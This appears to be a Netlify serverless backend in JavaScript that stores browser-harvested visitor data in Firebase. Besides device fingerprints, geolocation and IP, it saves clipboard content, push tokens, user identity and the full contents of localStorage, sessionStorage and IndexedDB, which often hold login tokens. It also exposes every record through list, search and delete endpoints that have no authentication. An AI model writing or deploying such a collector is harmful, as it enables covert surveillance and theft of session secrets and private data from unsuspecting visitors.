const admin = require('firebase-admin');

// Initialize Firebase Admin once
function initFirebase() {
  if (admin.apps.length) return admin.app();

  const serviceAccount = {
    type: process.env.FIREBASE_TYPE || 'service_account',
    project_id: process.env.FIREBASE_PROJECT_ID,
    private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID,
    private_key: process.env.FIREBASE_PRIVATE_KEY ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n') : undefined,
    client_email: process.env.FIREBASE_CLIENT_EMAIL,
    client_id: process.env.FIREBASE_CLIENT_ID,
    auth_uri: process.env.FIREBASE_AUTH_URI || 'https://accounts.google.com/o/oauth2/auth',
    token_uri: process.env.FIREBASE_TOKEN_URI || 'https://oauth2.googleapis.com/token',
    auth_provider_x509_cert_url: process.env.FIREBASE_AUTH_PROVIDER_X509_CERT_URL || 'https://www.googleapis.com/oauth2/v1/certs',
    client_x509_cert_url: process.env.FIREBASE_CLIENT_X509_CERT_URL
  };

  admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  return admin.app();
}

function json(statusCode, body) {
  return {
    statusCode,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  };
}

function parsePathSuffix(event) {
  const path = event.path || '';
  // Prefer function path form
  if (path.includes('/.netlify/functions/api/')) {
    const parts = path.split('/.netlify/functions/api/');
    return (parts[1] || '').replace(/^\//, '');
  }
  // Also support direct "/api/*" paths (in some local setups)
  if (path.includes('/api/')) {
    const parts = path.split('/api/');
    return (parts[1] || '').replace(/^\//, '');
  }
  return '';
}

exports.handler = async (event, context) => {
  try {
    const app = initFirebase();
    const db = admin.firestore();

    const method = event.httpMethod;
    const suffix = parsePathSuffix(event).replace(/\/?$/, '');

    // Determine client IP from headers (best-effort)
    const rawIp = event.headers['x-forwarded-for'] || event.headers['client-ip'] || event.headers['x-nf-client-connection-ip'] || '';
    const clientIp = String(rawIp).split(',')[0].trim();

    if (method === 'POST' && suffix === 'devices/save') {
      const body = event.body ? JSON.parse(event.body) : {};
      const deviceData = {
        deviceName: body.deviceName || null,
        osName: body.osName || null,
        browserName: body.browserName || null,
        screenResolution: body.screenResolution || null,
        platform: body.platform || null,
        userAgent: body.userAgent || null,
        timezone: body.timezone || null,
        languages: body.languages || null,
        connection: body.connection || null,
        battery: body.battery || null,
        hardwareConcurrency: body.hardwareConcurrency || null,
        deviceMemory: body.deviceMemory || null,
        maxTouchPoints: body.maxTouchPoints || null,
        cookieEnabled: body.cookieEnabled || null,
        doNotTrack: body.doNotTrack || null,
        geolocation: body.geolocation || null,
        consent: body.consent || body.consentState || body.consent_geolocation || null,
        publicIP: body.publicIP || null,
        ipGeolocation: body.ipGeolocation || null,
        userIdentity: body.userIdentity || null,
        mediaAccess: body.mediaAccess || null,
        clipboardContent: body.clipboardContent || null,
        pushNotificationGranted: body.pushNotificationGranted || null,
        pushNotificationToken: body.pushNotificationToken || null,
        pwaInfo: body.pwaInfo || null,
        bluetoothAccess: body.bluetoothAccess || null,
        usbAccess: body.usbAccess || null,
        localStorageData: body.localStorageData || null,
        sessionStorageData: body.sessionStorageData || null,
        indexedDBData: body.indexedDBData || null,
        clientIp,
        timestamp: body.timestamp || new Date().toISOString(),
        bodyRaw: body,
        createdAt: admin.firestore.FieldValue.serverTimestamp()
      };

      const docRef = await db.collection('devices').add(deviceData);
      return json(200, { success: true, id: docRef.id });
    }

    if (method === 'GET' && suffix === 'devices') {
      const snapshot = await db.collection('devices').orderBy('createdAt', 'desc').get();
      const devices = [];
      snapshot.forEach(doc => devices.push({ id: doc.id, ...doc.data() }));
      return json(200, devices);
    }

    if (method === 'GET' && suffix === 'devices/count') {
      const snapshot = await db.collection('devices').get();
      return json(200, { count: snapshot.size });
    }

    if (method === 'GET' && suffix.startsWith('devices/search/')) {
      const name = decodeURIComponent(suffix.replace('devices/search/', '')).toLowerCase();
      const snapshot = await db.collection('devices').orderBy('createdAt', 'desc').get();
      const devices = [];
      snapshot.forEach(doc => {
        const device = doc.data();
        if ((device.deviceName || '').toLowerCase().includes(name)) {
          devices.push({ id: doc.id, ...device });
        }
      });
      return json(200, devices);
    }

    if (method === 'DELETE' && suffix.startsWith('devices/')) {
      const id = suffix.replace('devices/', '');
      await db.collection('devices').doc(id).delete();
      return json(200, { success: true });
    }

    return json(404, { error: 'Not found', path: suffix, method });
  } catch (err) {
    console.error('Netlify function error', err);
    return json(500, { error: 'Internal error', details: err.message });
  }
};
